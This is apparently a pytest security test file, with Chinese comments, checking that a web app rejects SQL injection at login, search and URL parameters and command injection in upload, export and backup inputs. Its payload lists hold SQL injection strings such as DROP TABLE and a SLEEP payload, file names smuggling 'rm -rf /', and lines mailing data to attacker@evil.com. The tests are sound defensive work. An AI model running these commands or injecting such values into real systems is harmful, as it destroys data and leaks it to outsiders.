import pytest
import os
from app.models import User, Post
from app.services.security import SecurityService
from app.extensions import db

@pytest.fixture
def security_service():
    return SecurityService()

class TestSQLInjectionProtection:
    """SQL注入防护测试 [ST-005]"""

    def test_login_sql_injection(self, security_service, test_client):
        """测试登录SQL注入防护"""
        # 创建测试用户
        user = User(username="testuser", email="test@example.com")
        user.set_password("Test@password123")
        db.session.add(user)
        db.session.commit()

        # 测试SQL注入攻击
        sql_injection_attempts = [
            "' OR '1'='1",
            "admin' --",
            "' UNION SELECT * FROM users --",
            "'; DROP TABLE users; --",
            "' OR 'x'='x"
        ]

        for injection in sql_injection_attempts:
            response = test_client.post('/login', data={
                'username': injection,
                'password': injection
            })
            assert response.status_code == 401  # 应该登录失败

    def test_search_sql_injection(self, security_service, test_client):
        """测试搜索SQL注入防护"""
        # 创建测试用户和文章
        user = User(username="testuser", email="test@example.com")
        user.set_password("Test@password123")
        db.session.add(user)
        db.session.commit()

        post = Post(title="Test Post", content="Test content", author_id=user.id)
        db.session.add(post)
        db.session.commit()

        # 测试搜索SQL注入
        sql_injection_attempts = [
            "test' UNION SELECT * FROM users --",
            "test'; DROP TABLE posts; --",
            "' OR '1'='1",
            "test' OR 'x'='x",
            "test' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
        ]

        for injection in sql_injection_attempts:
            response = test_client.get(f'/search?q={injection}')
            assert response.status_code == 200
            # 验证结果不包含敏感信息
            assert 'password' not in response.data.decode()
            assert 'email' not in response.data.decode()

    def test_parameter_sql_injection(self, security_service, test_client):
        """测试参数SQL注入防护"""
        # 创建测试用户和文章
        user = User(username="testuser", email="test@example.com")
        user.set_password("Test@password123")
        db.session.add(user)
        db.session.commit()

        post = Post(title="Test Post", content="Test content", author_id=user.id)
        db.session.add(post)
        db.session.commit()

        # 测试URL参数SQL注入
        sql_injection_attempts = [
            "1 OR 1=1",
            "1; DROP TABLE posts",
            "1 UNION SELECT * FROM users",
            "-1 OR 1=1",
            f"{post.id}' OR '1'='1"
        ]

        for injection in sql_injection_attempts:
            response = test_client.get(f'/post/{injection}')
            if response.status_code == 200:
                # 如果返回成功，确保只返回预期的文章
                assert 'Test Post' in response.data.decode()
                assert 'password' not in response.data.decode()
            else:
                assert response.status_code in [404, 400]  # 应该返回404或400错误


class TestCommandInjectionProtection:
    """命令注入防护测试 [ST-006]"""

    def test_file_upload_command_injection(self, security_service, test_client):
        """测试文件上传命令注入防护"""
        # 创建测试用户并登录
        user = User(username="testuser", email="test@example.com")
        user.set_password("Test@password123")
        db.session.add(user)
        db.session.commit()

        test_client.post('/login', data={
            'username': 'testuser',
            'password': 'Test@password123'
        })

        # 测试命令注入文件名
        command_injection_filenames = [
            "test.jpg; rm -rf /",
            "test.jpg && echo 'hacked' > test.txt",
            "test.jpg | mail -s 'hacked' attacker@evil.com",
            "test.jpg`rm -rf /`",
            "test.jpg$(rm -rf /)"
        ]

        test_content = b"Test file content"
        for filename in command_injection_filenames:
            response = test_client.post('/upload', data={
                'file': (test_content, filename)
            })
            assert response.status_code in [400, 403]  # 应该被拒绝

            # 验证没有执行恶意命令
            assert not os.path.exists('test.txt')

    def test_export_command_injection(self, security_service, test_client):
        """测试导出功能命令注入防护"""
        # 创建测试用户并登录
        user = User(username="testuser", email="test@example.com")
        user.set_password("Test@password123")
        db.session.add(user)
        db.session.commit()

        test_client.post('/login', data={
            'username': 'testuser',
            'password': 'Test@password123'
        })

        # 测试导出参数命令注入
        command_injection_attempts = [
            "posts.csv; rm -rf /",
            "posts.csv && echo 'hacked' > test.txt",
            "posts.csv | mail -s 'hacked' attacker@evil.com",
            "posts.csv`rm -rf /`",
            "posts.csv$(rm -rf /)"
        ]

        for filename in command_injection_attempts:
            response = test_client.get(f'/export?filename={filename}')
            assert response.status_code in [400, 403]  # 应该被拒绝

            # 验证没有执行恶意命令
            assert not os.path.exists('test.txt')

    def test_backup_command_injection(self, security_service, test_client):
        """测试备份功能命令注入防护"""
        # 创建测试用户并登录
        user = User(username="testuser", email="test@example.com")
        user.set_password("Test@password123")
        db.session.add(user)
        db.session.commit()

        test_client.post('/login', data={
            'username': 'testuser',
            'password': 'Test@password123'
        })

        # 测试备份参数命令注入
        command_injection_attempts = [
            "../backup; rm -rf /",
            "backup && echo 'hacked' > test.txt",
            "backup | mail -s 'hacked' attacker@evil.com",
            "backup`rm -rf /`",
            "backup$(rm -rf /)"
        ]

        for path in command_injection_attempts:
            response = test_client.post('/backup', data={
                'path': path
            })
            assert response.status_code in [400, 403]  # 应该被拒绝

            # 验证没有执行恶意命令
            assert not os.path.exists('test.txt')

            # 验证备份目录的完整性
            assert os.path.exists('backup')  # 确保备份目录仍然存在 